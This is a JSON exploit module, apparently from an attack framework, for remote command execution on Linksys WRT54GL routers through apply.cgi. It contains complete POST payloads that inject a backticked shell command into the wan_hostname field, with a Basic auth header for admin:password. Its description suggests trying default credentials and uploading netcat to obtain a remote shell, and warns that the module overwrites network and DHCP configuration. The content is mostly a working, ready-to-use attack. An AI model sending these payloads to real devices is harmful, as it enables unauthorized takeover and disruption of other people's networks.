{
   "requests" : {
      "EXPLOIT2" : {
         "METHOD" : "GET",
         "PATH" : "",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #2 Request : [GET] ",
         "PAYLOAD" : "",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded",
            "Authorization" : "Basic YWRtaW46cGFzc3dvcmQ="
         }
      },
      "EXPLOIT1" : {
         "METHOD" : "POST",
         "PATH" : "",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PAYLOAD" : "submit_button=index&change_action=1&submit_type=1&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=cisco&wan_hostname=%60__COMMAND__%60&wan_domain=test&mtu_enable=1&wan_mtu=1500&lan_ipaddr_0=127&lan_ipaddr_1=0&lan_ipaddr_2=0&lan_ipaddr_3=1&lan_netmask=255.255.255.0&lan_proto=dhcp&dhcp_check=1&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08%2b1%2b1&_daylight_time=1",
         "HEADERS" : {
            "Authorization" : "Basic YWRtaW46cGFzc3dvcmQ=",
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #1 Request : [POST] /"
      }
   },
   "osvdb" : 89421,
   "paths" : [
      "apply.cgi"
   ],
   "title of the router" : "cisco",
   "name" : "LinksysWrt54glExec",
   "user to login with" : "admin",
   "references" : [
      "http://www.s3cur1ty.de/m1adv2013-01",
      "http://www.s3cur1ty.de/attacking-linksys-wrt54gl"
   ],
   "msf_module" : "linksys_wrt54gl_exec",
   "variables" : {
      "NETMASK" : {
         "DESCRIPTION" : "LAN Netmask of the router",
         "VALUE" : "255.255.255.0"
      },
      "WAN_MTU" : {
         "DESCRIPTION" : "WAN MTU",
         "VALUE" : 1500
      },
      "WANMTU" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "WANDOMAIN" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "CMD" : {
         "DESCRIPTION" : "The command to execute",
         "VALUE" : "ping 127.0.0.1"
      },
      "IP[2]" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "IP[1]" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "HTTPPASSWORD" : {
         "DESCRIPTION" : "Password to login with",
         "VALUE" : "password"
      },
      "IP[0]" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "IP[3]" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "ROUTERNAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PATH" : {
         "VALUE" : "/apply.cgi",
         "DESCRIPTION" : "PATH to OS Command Injection"
      }
   },
   "title" : "Linksys WRT54GL Remote Command Execution",
   "payload" : "submit_button=index&change_action=1&submit_type=1&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=__ROUTERNAME__&wan_hostname=`__CMD__`&wan_domain=__WANDOMAIN__&mtu_enable=1&wan_mtu=__WANMTU__&lan_ipaddr_0=__IP\\[0\\]__&lan_ipaddr_1=__IP\\[1\\]__&lan_ipaddr_2=__IP\\[2\\]__&lan_ipaddr_3=__IP\\[3\\]__&lan_netmask=__NETMASK__&lan_proto=dhcp&dhcp_check=1&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08+1+1&_daylight_time=1&",
   "method" : "POST",
   "platform" : "ALL",
   "description" : "\n\n          Some Linksys Routers are vulnerable to OS Command injection.\n\n        You will need credentials to the web interface to access the vulnerable part\n\n        of the application.\n\n        Default credentials are always a good starting point. admin/admin or admin\n\n        and blank password could be a first try.\n\n        Note: This is a blind OS command injection vulnerability. This means that\n\n        you will not see any output of your command. Try a ping command to your\n\n        local system and observe the packets with tcpdump (or equivalent) for a first test.\n\n\n\n        Hint: To get a remote shell you could upload a netcat binary and exec it.\n\n        WARNING: this module will overwrite network and DHCP configuration.\n\n      ",
   "wan domain title" : "test",
   "detection" : {},
   "informations" : {
      "VARIABLES" : {
         "IP[2]" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "HTTPPASSWORD" : {
            "DESCRIPTION" : "Password to login with",
            "VALUE" : "password"
         },
         "IP[1]" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "IP[3]" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "ROUTERNAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "IP[0]" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "PATH" : {
            "VALUE" : "/apply.cgi",
            "DESCRIPTION" : "PATH to OS Command Injection"
         },
         "NETMASK" : {
            "DESCRIPTION" : "LAN Netmask of the router",
            "VALUE" : "255.255.255.0"
         },
         "WAN_MTU" : {
            "DESCRIPTION" : "WAN MTU",
            "VALUE" : 1500
         },
         "CMD" : {
            "DESCRIPTION" : "The command to execute",
            "VALUE" : "ping 127.0.0.1"
         },
         "WANMTU" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "WANDOMAIN" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         }
      },
      "DESCRIPTION" : "\n\n          Some Linksys Routers are vulnerable to OS Command injection.\n\n        You will need credentials to the web interface to access the vulnerable part\n\n        of the application.\n\n        Default credentials are always a good starting point. admin/admin or admin\n\n        and blank password could be a first try.\n\n        Note: This is a blind OS command injection vulnerability. This means that\n\n        you will not see any output of your command. Try a ping command to your\n\n        local system and observe the packets with tcpdump (or equivalent) for a first test.\n\n\n\n        Hint: To get a remote shell you could upload a netcat binary and exec it.\n\n        WARNING: this module will overwrite network and DHCP configuration.\n\n      ",
      "OSVDB" : 89421,
      "PAYLOAD" : "submit_button=index&change_action=1&submit_type=1&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=__ROUTERNAME__&wan_hostname=`__CMD__`&wan_domain=__WANDOMAIN__&mtu_enable=1&wan_mtu=__WANMTU__&lan_ipaddr_0=__IP\\[0\\]__&lan_ipaddr_1=__IP\\[1\\]__&lan_ipaddr_2=__IP\\[2\\]__&lan_ipaddr_3=__IP\\[3\\]__&lan_netmask=__NETMASK__&lan_proto=dhcp&dhcp_check=1&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08+1+1&_daylight_time=1&",
      "USER TO LOGIN WITH" : "admin",
      "REFERENCES" : [
         "http://www.s3cur1ty.de/m1adv2013-01",
         "http://www.s3cur1ty.de/attacking-linksys-wrt54gl"
      ],
      "TITLE OF THE ROUTER" : "cisco",
      "TYPE" : "MSF",
      "MSF_MODULE" : "linksys_wrt54gl_exec",
      "TITLE" : "Linksys WRT54GL Remote Command Execution",
      "name" : "LinksysWrt54glExec",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "METHOD" : "GET",
            "PATH" : "",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #2 Request : [GET] ",
            "PAYLOAD" : "",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded",
               "Authorization" : "Basic YWRtaW46cGFzc3dvcmQ="
            }
         },
         "EXPLOIT1" : {
            "METHOD" : "POST",
            "PATH" : "",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PAYLOAD" : "submit_button=index&change_action=1&submit_type=1&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=cisco&wan_hostname=%60__COMMAND__%60&wan_domain=test&mtu_enable=1&wan_mtu=1500&lan_ipaddr_0=127&lan_ipaddr_1=0&lan_ipaddr_2=0&lan_ipaddr_3=1&lan_netmask=255.255.255.0&lan_proto=dhcp&dhcp_check=1&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08%2b1%2b1&_daylight_time=1",
            "HEADERS" : {
               "Authorization" : "Basic YWRtaW46cGFzc3dvcmQ=",
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #1 Request : [POST] /"
         }
      },
      "METHOD" : "POST",
      "WAN DOMAIN TITLE" : "test",
      "PATHS" : [
         "apply.cgi"
      ],
      "PLATFORM" : "ALL"
   },
   "type" : "MSF",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/"
}
